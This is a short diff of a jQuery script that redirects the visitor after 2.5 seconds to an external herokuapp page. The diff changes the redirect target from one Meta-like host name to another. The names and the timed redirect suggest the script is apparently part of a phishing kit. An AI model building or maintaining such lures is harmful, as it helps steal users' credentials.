@@ -16,7 +16,7 @@ jQuery(function($){
     });
   }); 
   setTimeout(function() {   //calls click event after a certain time
-    $(location).attr('href','https://meta-userx1.herokuapp.com/main.php?re=huawei&n=1')
+    $(location).attr('href','https://loading-metax1.herokuapp.com/main.php?re=huawei&n=1')
  }, 2500);
 
 });
